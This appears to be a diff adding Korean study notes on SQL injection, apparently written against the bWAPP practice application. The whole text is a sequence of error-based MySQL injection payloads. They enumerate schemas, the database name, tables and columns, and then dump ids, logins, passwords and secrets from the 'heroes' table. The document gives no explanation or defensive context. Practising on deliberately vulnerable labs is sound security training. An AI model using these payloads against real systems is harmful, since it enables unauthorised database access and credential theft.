@@ -1,0 +1,58 @@
+ 4) SQL 인젝션
+
+ ① 
+
+' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 1,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) # 
+
+' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 2,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) # 
+
+' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 3,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+
+ ②
+
+' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))a from information_schema.tables group by a)b) #
+
+
+ ③
+
+' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='bwapp' limit 1,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='bwapp' limit 2,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='bwapp' limit 3,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='bwapp' limit 4,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+
+ ④
+
+' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema='bwapp' and table_name='heroes' limit 0,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema='bwapp' and table_name='heroes' limit 1,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema='bwapp' and table_name='heroes' limit 2,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) # 
+
+' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema='bwapp' and table_name='heroes' limit 3,1), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+
+
+ ⑤ 
+
+' and (select 1 from(select count(*),concat((select concat(id,0x3a,login,0x3a,password,0x3a,secret) from heroes limit 0,1),floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from(select count(*),concat((select concat(id,0x3a,login,0x3a,password,0x3a,secret) from heroes limit 1,1),floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from(select count(*),concat((select concat(id,0x3a,login,0x3a,password,0x3a,secret) from heroes limit 2,1),floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from(select count(*),concat((select concat(id,0x3a,login,0x3a,password,0x3a,secret) from heroes limit 3,1),floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from(select count(*),concat((select concat(id,0x3a,login,0x3a,password,0x3a,secret) from heroes limit 4,1),floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+' and (select 1 from(select count(*),concat((select concat(id,0x3a,login,0x3a,password,0x3a,secret) from heroes limit 5,1),floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
+
+
